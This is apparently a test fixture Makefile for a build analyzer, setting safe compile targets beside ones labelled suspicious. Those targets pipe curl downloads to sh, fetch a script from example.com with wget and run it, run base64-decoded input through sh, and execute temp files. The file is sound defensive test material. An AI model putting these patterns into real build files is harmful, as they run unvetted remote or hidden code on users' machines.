# Example Makefile with various patterns (some suspicious)
# This is for testing the build analyzer

CC = gcc
CFLAGS = -Wall -O2
TARGET = myapp

# Safe target
all: $(TARGET)

# Standard compilation - SAFE
$(TARGET): main.o utils.o
	$(CC) $(CFLAGS) -o $(TARGET) main.o utils.o
	@echo "Build complete!"

main.o: main.c
	$(CC) $(CFLAGS) -c main.c

utils.o: utils.c
	$(CC) $(CFLAGS) -c utils.c

# SUSPICIOUS: Downloads and pipes to shell
install-deps:
	curl -sSL https://get.docker.com | sh
	@echo "Dependencies installed"

# SUSPICIOUS: Silent download with execution
download-tool:
	wget -q https://example.com/tool.sh && chmod +x tool.sh && ./tool.sh

# SUSPICIOUS: Base64 obfuscation
setup:
	echo "ZWNobyAiSGVsbG8gV29ybGQi" | base64 -d | sh

# SUSPICIOUS: Temp file execution
test:
	mktemp /tmp/test_XXXX && chmod +x /tmp/test_* && /tmp/test_*

# Safe cleanup target
clean:
	rm -f *.o $(TARGET)
	@echo "Cleaned build files"

.PHONY: all clean install-deps download-tool setup test